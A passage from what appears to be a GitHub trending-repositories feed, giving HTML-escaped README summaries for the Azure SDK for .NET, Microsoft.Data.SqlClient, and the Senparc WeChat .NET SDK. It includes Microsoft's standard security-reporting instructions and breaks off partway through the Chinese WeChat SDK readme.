    <summary type="html">&lt;p&gt;This repository is for active development of the Azure SDK for .NET. For consumers of the SDK we recommend visiting our public developer docs at https://docs.microsoft.com/dotnet/azure/ or our versioned developer docs at https://azure.github.io/azure-sdk-for-net.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Azure SDK for .NET&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://azure.github.io/azure-sdk/releases/latest/dotnet.html&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/packages-latest-blue.svg?sanitize=true&#34; alt=&#34;Packages&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://azuresdkartifacts.blob.core.windows.net/azure-sdk-for-net/dependencies/dependencies.html&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/dependency-report-blue.svg?sanitize=true&#34; alt=&#34;Dependencies&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://azuresdkartifacts.blob.core.windows.net/azure-sdk-for-net/dependencies/dependencyGraph/dagre.html&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/dependency-graph-blue.svg?sanitize=true&#34; alt=&#34;Dependencies Graph&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;This repository is for active development of the Azure SDK for .NET. For consumers of the SDK we recommend visiting our &lt;a href=&#34;https://docs.microsoft.com/dotnet/azure/&#34;&gt;public developer docs&lt;/a&gt; or our versioned &lt;a href=&#34;https://azure.github.io/azure-sdk-for-net&#34;&gt;developer docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Getting started&lt;/h2&gt; &#xA;&lt;p&gt;To get started with a library, see the README.md file located in the library&#39;s project folder. You can find these library folders grouped by service in the /sdk directory.&lt;/p&gt; &#xA;&lt;p&gt;For tutorials, samples, quick starts, and other documentation, go to &lt;a href=&#34;https://docs.microsoft.com/dotnet/azure/&#34;&gt;Azure for .NET Developers&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Packages available&lt;/h2&gt; &#xA;&lt;p&gt;Each service might have a number of libraries available from each of the following categories:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-sdk-for-net/main/#client-new-releases&#34;&gt;Client - New Releases&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-sdk-for-net/main/#client-previous-versions&#34;&gt;Client - Previous Versions&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-sdk-for-net/main/#management-new-releases&#34;&gt;Management - New Releases&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-sdk-for-net/main/#management-previous-versions&#34;&gt;Management - Previous Versions&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Client: New Releases&lt;/h3&gt; &#xA;&lt;p&gt;New wave of packages that we are announcing as &lt;strong&gt;GA&lt;/strong&gt; and several that are currently releasing in &lt;strong&gt;preview&lt;/strong&gt;. These libraries follow the &lt;a href=&#34;https://azure.github.io/azure-sdk/dotnet/guidelines/&#34;&gt;Azure SDK Design Guidelines for .NET&lt;/a&gt; and share a number of core features such as HTTP retries, logging, transport protocols, authentication protocols, etc., so that once you learn how to use these features in one client library, you will know how to use them in other client libraries. You can learn about these shared features at &lt;a href=&#34;https://github.com/Azure/azure-sdk-for-net/raw/main/sdk/core/Azure.Core/README.md&#34;&gt;Azure.Core&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;These new client libraries can be identified by the naming used for their folder, package, and namespace. Each will start with &lt;code&gt;Azure&lt;/code&gt;, followed by the service category, and then the name of the service. For example &lt;code&gt;Azure.Storage.Blobs&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For a complete list of available packages, please see the &lt;a href=&#34;https://azure.github.io/azure-sdk/releases/latest/dotnet.html&#34;&gt;latest available packages&lt;/a&gt; page.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;NOTE: If you need to ensure your code is ready for production we strongly recommend using one of the stable, non-preview libraries.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;Client: Previous Versions&lt;/h3&gt; &#xA;&lt;p&gt;Last stable versions of packages that are production-ready. These libraries provide similar functionalities to the preview packages, as they allow you to use and consume existing resources and interact with them, for example: upload a storage blob. Stable library directories typically contain &#39;Microsoft.Azure&#39; in their names, e.g. &#39;Microsoft.Azure.KeyVault&#39;. They might not implement the &lt;a href=&#34;https://azure.github.io/azure-sdk/dotnet_introduction.html&#34;&gt;guidelines&lt;/a&gt; or have the same feature set as the November releases. They do however offer wider coverage of services.&lt;/p&gt; &#xA;&lt;h3&gt;Management: New Releases&lt;/h3&gt; &#xA;&lt;p&gt;A new set of management libraries that follow the &lt;a href=&#34;https://azure.github.io/azure-sdk/dotnet_introduction.html&#34;&gt;Azure SDK Design Guidelines for .NET&lt;/a&gt; and based on &lt;a href=&#34;https://github.com/Azure/azure-sdk-for-net/tree/main/sdk/core/Azure.Core&#34;&gt;Azure.Core libraries&lt;/a&gt; are now in Public Preview. These new libraries provide a number of core capabilities that are shared amongst all Azure SDKs, including the intuitive Azure Identity library, an HTTP Pipeline with custom policies, error-handling, distributed tracing, and much more. You can find the list of new packages &lt;a href=&#34;https://azure.github.io/azure-sdk/releases/latest/dotnet.html&#34;&gt;on this page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To get started with these new libraries, please see the &lt;a href=&#34;https://github.com/Azure/azure-sdk-for-net/raw/main/doc/mgmt_preview_quickstart.md&#34;&gt;quickstart guide here&lt;/a&gt;. These new libraries can be identified by namespaces that start with &lt;code&gt;Azure.ResourceManager&lt;/code&gt;, e.g. &lt;code&gt;Azure.ResourceManager.Network&lt;/code&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;NOTE: If you need to ensure your code is ready for production use one of the stable, non-preview libraries.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;Management: Previous Versions&lt;/h3&gt; &#xA;&lt;p&gt;For a complete list of management libraries which enable you to provision and manage Azure resources, please check &lt;a href=&#34;https://azure.github.io/azure-sdk/releases/latest/all/dotnet.html&#34;&gt;here&lt;/a&gt;. They might not have the same feature set as the new releases but they do offer wider coverage of services. Previous versions of management libraries can be identified by namespaces that start with &lt;code&gt;Microsoft.Azure.Management&lt;/code&gt;, e.g. &lt;code&gt;Microsoft.Azure.Management.Network&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Documentation and code samples for these libraries can be found &lt;a href=&#34;https://azure.github.io/azure-sdk-for-net&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Need help?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;For reference documentation visit the &lt;a href=&#34;https://aka.ms/net-docs&#34;&gt;Azure SDK for .NET API Reference&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;For tutorials, samples, quick starts, and other documentation, go to &lt;a href=&#34;https://docs.microsoft.com/dotnet/azure/&#34;&gt;Azure for .NET Developers&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;File an issue via &lt;a href=&#34;https://github.com/Azure/azure-sdk-for-net/issues/new/choose&#34;&gt;Github Issues&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Check &lt;a href=&#34;https://stackoverflow.com/questions/tagged/azure+.net&#34;&gt;previous questions&lt;/a&gt; or ask new ones on StackOverflow using &lt;code&gt;azure&lt;/code&gt; and &lt;code&gt;.net&lt;/code&gt; tags.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Community&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Chat with other community members &lt;a href=&#34;https://gitter.im/azure/azure-sdk-for-net?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge&#34;&gt;&lt;img src=&#34;https://badges.gitter.im/Join%20Chat.svg?sanitize=true&#34; alt=&#34;Join the chat at https://gitter.im/azure/azure-sdk-for-net&#34;&gt;&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Reporting security issues and security bugs&lt;/h3&gt; &#xA;&lt;p&gt;Security issues and bugs should be reported privately, via email, to the Microsoft Security Response Center (MSRC) &lt;a href=&#34;mailto:secure@microsoft.com&#34;&gt;secure@microsoft.com&lt;/a&gt;. You should receive a response within 24 hours. If for some reason you do not, please follow up via email to ensure we received your original message. Further information, including the MSRC PGP key, can be found in the &lt;a href=&#34;https://www.microsoft.com/msrc/faqs-report-an-issue&#34;&gt;Security TechCenter&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;We want your thoughts!&lt;/h2&gt; &#xA;&lt;h3&gt;Feature Requests&lt;/h3&gt; &#xA;&lt;p&gt;What features are important to you? You can let us know by looking at our open &lt;a href=&#34;https://github.com/Azure/azure-sdk-for-net/issues?q=is%3Aopen+label%3Afeature-request+sort%3Areactions-%2B1-desc&#34;&gt;feature requests&lt;/a&gt; and sharing your thoughts by giving the issue a thumbs up or thumbs down. (Note the list is sorted by number of thumbs up in descending order.)&lt;/p&gt; &#xA;&lt;h3&gt;Design Discussions&lt;/h3&gt; &#xA;&lt;p&gt;We would love to incorporate the community&#39;s input into our library design process. Here&#39;s a list of &lt;a href=&#34;https://github.com/Azure/azure-sdk-for-net/labels/design-discussion&#34;&gt;design discussions&lt;/a&gt; that we&#39;re currently having. Participate in the discussions by leaving your comments in the issue!&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;For details on contributing to this repository, see the &lt;a href=&#34;https://github.com/Azure/azure-sdk-for-net/raw/main/CONTRIBUTING.md&#34;&gt;contributing guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&#34;https://cla.microsoft.com&#34;&gt;https://cla.microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;When you submit a pull request, a CLA-bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repositories using our CLA.&lt;/p&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://azure-sdk-impressions.azurewebsites.net/api/impressions/azure-sdk-for-net%2FREADME.png&#34; alt=&#34;Impressions&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>dotnet/SqlClient</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/dotnet/SqlClient</id>
    <link href="https://github.com/dotnet/SqlClient" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Microsoft.Data.SqlClient provides database connectivity to SQL Server for .NET applications.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/sqlclient/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square&#34; alt=&#34;GitHub license&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.Data.SqlClient&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Microsoft.Data.SqlClient?label=Nuget.org%20Downloads&amp;amp;style=flat-square&amp;amp;color=blue&#34; alt=&#34;Nuget&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://gitter.im/Microsoft/mssql-developers&#34;&gt;&lt;img src=&#34;https://img.shields.io/gitter/room/badges/shields.svg?style=flat-square&amp;amp;color=blue&#34; alt=&#34;Gitter&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Microsoft SqlClient Data Provider for SQL Server&lt;/h1&gt; &#xA;&lt;p&gt;Welcome to the home of the Microsoft ADO.NET driver for SQL Server aka the Microsoft.Data.SqlClient GitHub repository.&lt;/p&gt; &#xA;&lt;p&gt;Microsoft.Data.SqlClient is a data provider for Microsoft SQL Server and Azure SQL Database. Now in General Availability, it is a union of the two System.Data.SqlClient components which live independently in .NET Framework and .NET Core. Going forward, support for new SQL Server features will be implemented in Microsoft.Data.SqlClient.&lt;/p&gt; &#xA;&lt;h2&gt;Supportability&lt;/h2&gt; &#xA;&lt;p&gt;The Microsoft.Data.SqlClient package supports the below environments:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;.NET Framework 4.6.2+&lt;/li&gt; &#xA; &lt;li&gt;.NET Core 3.1+&lt;/li&gt; &#xA; &lt;li&gt;.NET Standard 2.0+&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The source code of this library is now available under the MIT license.&lt;/p&gt; &#xA;&lt;h2&gt;Download&lt;/h2&gt; &#xA;&lt;p&gt;The Microsoft.Data.SqlClient NuGet package is available on &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.Data.SqlClient/&#34;&gt;NuGet.org&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;SNI Package References&lt;/h2&gt; &#xA;&lt;p&gt;For the .NET Framework driver on Windows, a package reference to &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.Data.SqlClient.SNI/&#34;&gt;Microsoft.Data.SqlClient.SNI&lt;/a&gt; loads native &lt;code&gt;Microsoft.Data.SqlClient.SNI.x64.dll&lt;/code&gt; and &lt;code&gt;Microsoft.Data.SqlClient.SNI.x86.dll&lt;/code&gt; libraries into the client&#39;s build directories.&lt;/p&gt; &#xA;&lt;p&gt;For the .NET Core driver on Windows, a package reference to &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.Data.SqlClient.SNI.runtime/&#34;&gt;Microsoft.Data.SqlClient.SNI.runtime&lt;/a&gt; loads &lt;code&gt;arm&lt;/code&gt;, &lt;code&gt;arm64&lt;/code&gt;, &lt;code&gt;x64&lt;/code&gt; and &lt;code&gt;x86&lt;/code&gt; native &lt;code&gt;Microsoft.Data.SqlClient.SNI.dll&lt;/code&gt; libraries into the client&#39;s build directories.&lt;/p&gt; &#xA;&lt;h2&gt;Helpful Links&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;left&#34;&gt;Topic&lt;/th&gt; &#xA;   &lt;th align=&#34;left&#34;&gt;Link to File&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;Coding Style&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/SqlClient/main/coding-style.md&#34;&gt;coding-style.md&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;Guidelines for building the driver&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/SqlClient/main/BUILDGUIDE.md&#34;&gt;BUILDGUIDE.md&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;Guidelines for Contributors&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/SqlClient/main/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;Changelog for all driver releases&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/SqlClient/main/CHANGELOG.md&#34;&gt;CHANGELOG.md&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;Support Policy&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/SqlClient/main/SUPPORT.md&#34;&gt;SUPPORT.md&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;Code of Conduct&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/SqlClient/main/CODE_OF_CONDUCT.md&#34;&gt;CODE_OF_CONDUCT.md&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;Copyright Information&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/SqlClient/main/COPYRIGHT.md&#34;&gt;COPYRIGHT.md&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Our Featured Contributors&lt;/h2&gt; &#xA;&lt;p&gt;Special thanks to everyone who has contributed to the project. We thank you for your continuous support in improving the SqlClient library!&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Wraith (&lt;a href=&#34;https://github.com/Wraith2&#34;&gt;@Wraith2&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Erik Ejlskov Jensen (&lt;a href=&#34;https://github.com/ErikEJ&#34;&gt;@ErikEJ&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Simon Cropp (&lt;a href=&#34;https://github.com/SimonCropp&#34;&gt;@SimonCropp&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Stefán Jökull Sigurðarson (&lt;a href=&#34;https://github.com/stebet&#34;&gt;@stebet&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Shay Rojansky (&lt;a href=&#34;https://github.com/roji&#34;&gt;@roji&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Stephen Toub (&lt;a href=&#34;https://github.com/stephentoub&#34;&gt;@stephentoub&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Rasmus Melchior Jacobsen (&lt;a href=&#34;https://github.com/rmja&#34;&gt;@rmja&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Phillip Haydon (&lt;a href=&#34;https://github.com/phillip-haydon&#34;&gt;@phillip-haydon&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Robin Sue (&lt;a href=&#34;https://github.com/Suchiman&#34;&gt;@Suchiman&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Up-to-date list of contributors: &lt;a href=&#34;https://github.com/dotnet/SqlClient/graphs/contributors&#34;&gt;Contributor Insights&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Release Notes&lt;/h2&gt; &#xA;&lt;p&gt;All preview and stable driver release notes are available under &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/SqlClient/main/release-notes&#34;&gt;release-notes&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Porting from System.Data.SqlClient&lt;/h2&gt; &#xA;&lt;p&gt;Refer to &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/SqlClient/main/porting-cheat-sheet.md&#34;&gt;porting-cheat-sheet.md&lt;/a&gt; for a safe porting experience from System.Data.SqlClient to Microsoft.Data.SqlClient and share your experience with us by advancing this guide for future developers.&lt;/p&gt; &#xA;&lt;h2&gt;Still have questions?&lt;/h2&gt; &#xA;&lt;p&gt;Check out our &lt;a href=&#34;https://github.com/dotnet/SqlClient/wiki/Frequently-Asked-Questions&#34;&gt;FAQ&lt;/a&gt;. Still not answered? Create an &lt;a href=&#34;https://github.com/dotnet/SqlClient/issues/new/choose&#34;&gt;issue&lt;/a&gt; to ask a question.&lt;/p&gt; &#xA;&lt;!-- BEGIN MICROSOFT SECURITY.MD V0.0.3 BLOCK --&gt; &#xA;&lt;h2&gt;Security&lt;/h2&gt; &#xA;&lt;p&gt;Microsoft takes the security of our software products and services seriously, which includes all source code repositories managed through our GitHub organizations, which include &lt;a href=&#34;https://github.com/Microsoft&#34;&gt;Microsoft&lt;/a&gt;, &lt;a href=&#34;https://github.com/Azure&#34;&gt;Azure&lt;/a&gt;, &lt;a href=&#34;https://github.com/dotnet&#34;&gt;DotNet&lt;/a&gt;, &lt;a href=&#34;https://github.com/aspnet&#34;&gt;AspNet&lt;/a&gt;, &lt;a href=&#34;https://github.com/xamarin&#34;&gt;Xamarin&lt;/a&gt;, and &lt;a href=&#34;https://opensource.microsoft.com/&#34;&gt;our GitHub organizations&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If you believe you have found a security vulnerability in any Microsoft-owned repository that meets Microsoft&#39;s &lt;a href=&#34;https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc751383(v=technet.10)&#34;&gt;Microsoft&#39;s definition of a security vulnerability&lt;/a&gt;, please report it to us as described below.&lt;/p&gt; &#xA;&lt;h2&gt;Reporting Security Issues&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Please do not report security vulnerabilities through public GitHub issues.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Instead, please report them to the Microsoft Security Response Center (MSRC) at &lt;a href=&#34;https://msrc.microsoft.com/create-report&#34;&gt;https://msrc.microsoft.com/create-report&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If you prefer to submit without logging in, send email to &lt;a href=&#34;mailto:secure@microsoft.com&#34;&gt;secure@microsoft.com&lt;/a&gt;. If possible, encrypt your message with our PGP key; please download it from the the &lt;a href=&#34;https://www.microsoft.com/en-us/msrc/pgp-key-msrc&#34;&gt;Microsoft Security Response Center PGP Key page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You should receive a response within 24 hours. If for some reason you do not, please follow up via email to ensure we received your original message. Additional information can be found at &lt;a href=&#34;https://www.microsoft.com/msrc&#34;&gt;microsoft.com/msrc&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Please include the requested information listed below (as much as you can provide) to help us better understand the nature and scope of the possible issue:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Type of issue (e.g. buffer overflow, SQL injection, cross-site scripting, etc.)&lt;/li&gt; &#xA; &lt;li&gt;Full paths of source file(s) related to the manifestation of the issue&lt;/li&gt; &#xA; &lt;li&gt;The location of the affected source code (tag/branch/commit or direct URL)&lt;/li&gt; &#xA; &lt;li&gt;Any special configuration required to reproduce the issue&lt;/li&gt; &#xA; &lt;li&gt;Step-by-step instructions to reproduce the issue&lt;/li&gt; &#xA; &lt;li&gt;Proof-of-concept or exploit code (if possible)&lt;/li&gt; &#xA; &lt;li&gt;Impact of the issue, including how an attacker might exploit the issue&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This information will help us triage your report more quickly.&lt;/p&gt; &#xA;&lt;p&gt;If you are reporting for a bug bounty, more complete reports can contribute to a higher bounty award. Please visit our &lt;a href=&#34;https://microsoft.com/msrc/bounty&#34;&gt;Microsoft Bug Bounty Program&lt;/a&gt; page for more details about our active programs.&lt;/p&gt; &#xA;&lt;h2&gt;Preferred Languages&lt;/h2&gt; &#xA;&lt;p&gt;We prefer all communications to be in English.&lt;/p&gt; &#xA;&lt;h2&gt;Policy&lt;/h2&gt; &#xA;&lt;p&gt;Microsoft follows the principle of &lt;a href=&#34;https://www.microsoft.com/en-us/msrc/cvd&#34;&gt;Coordinated Vulnerability Disclosure&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;!-- END MICROSOFT SECURITY.MD BLOCK --&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;The Microsoft.Data.SqlClient Driver for SQL Server is licensed under the MIT license. See the &lt;a href=&#34;https://github.com/dotnet/SqlClient/raw/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt; file for more details.&lt;/p&gt; &#xA;&lt;h2&gt;Trademarks&lt;/h2&gt; &#xA;&lt;p&gt;This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft trademarks or logos is subject to and must follow Microsoft&#39;s Trademark &amp;amp; Brand Guidelines. Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship. Any use of third-party trademarks or logos are subject to those third-party&#39;s policies.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>JeffreySu/WeiXinMPSDK</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/JeffreySu/WeiXinMPSDK</id>
    <link href="https://github.com/JeffreySu/WeiXinMPSDK" rel="alternate"></link>
    <summary type="html">&lt;p&gt;微信全平台 SDK Senparc.Weixin for C#，支持 .NET Framework 及 .NET Core、.NET 6.0。已支持微信公众号、小程序、小游戏、企业号、企业微信、开放平台、微信支付、JSSDK、微信周边等全平台。 WeChat SDK for C#.&lt;/p&gt;&lt;hr&gt;&lt;img src=&#34;https://sdk.weixin.senparc.com/images/senparc-logo-500.jpg&#34;&gt; &#xA;&lt;h1&gt;Senparc.Weixin —— 微信 .NET SDK&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://mysenparc.visualstudio.com/Senparc%20SDK/_build/latest?definitionId=36&#34;&gt;&lt;img src=&#34;https://mysenparc.visualstudio.com/Senparc%20SDK/_apis/build/status/Weixin%20SDK/Senparc.Weixin%20Dev-%E5%86%85%E9%83%A8-%E8%87%AA%E5%8A%A8-.Net6&#34; alt=&#34;Build status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.svg?sanitize=true&#34; alt=&#34;NuGet&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/commits/master&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/commit-activity/4w/JeffreySu/WeiXinMPSDK.svg?sanitize=true&#34; alt=&#34;GitHub commit activity the past week, 4 weeks, year&#34;&gt;&lt;/a&gt; &lt;a href=&#34;http://www.apache.org/licenses/LICENSE-2.0&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/JeffreySu/WeiXinMPSDK.svg?sanitize=true&#34; alt=&#34;license&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/readme.en.md&#34;&gt;[English Version]&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;使用 Senparc.Weixin，您可以方便快速地开发微信全平台的应用（包括微信公众号、小程序、小游戏、企业号、开放平台、微信支付、JS-SDK、微信硬件/蓝牙，等等）。本项目的 Demo 同样适合初学者进行 .NET 编程学习。&lt;/p&gt; &#xA;&lt;p&gt;目前 Senparc.Weixin 已经支持几乎所有微信平台模块和接口，并同时支持 &lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/Developer&#34;&gt;.NET 3.5 / 4.0 / 4.5 / .NET Standard 2.x / .NET Core 2.x / .NET Core 3.x / .NET 6.0&lt;/a&gt; 多种框架。&lt;/p&gt; &#xA;&lt;p&gt;Senparc.Weixin SDK 是目前使用率最高的微信 .NET SDK，也是国内最受欢迎的 .NET 开源项目之一。&lt;/p&gt; &#xA;&lt;p&gt;自 2013 年起立项 8 年多来，我们一直保持着项目的持续更新，并将完整的源代码以及设计思想毫无保留地分享给大家，希望有更多的人可以从中受益，理解并传播开源的精神，一同助力中国开源事业！感恩一路上给我们提供帮助的朋友们！&lt;/p&gt; &#xA;&lt;p&gt;如果你喜欢并希望我们继续优化这个项目，请给我们一个 ★Star ：)&lt;/p&gt; &#xA;&lt;h2&gt;公告&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;span&gt;🏆&lt;/span&gt; 《&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/issues/2454&#34;&gt;2020-2021年度 盛派开发者社区优秀贡献者入围名单&lt;/a&gt;》公布，请注意查看并登记信息，2021 年 9 月 13 日 10:24 AM 截止登记 &lt;span&gt;😄&lt;/span&gt;&lt;br&gt; 🔒 &lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/master/src/Senparc.Weixin.TenPay/Senparc.Weixin.TenPayV3&#34;&gt;微信支付 V3 模块&lt;/a&gt;已上线！&lt;br&gt; ⚡ Sample 已支持 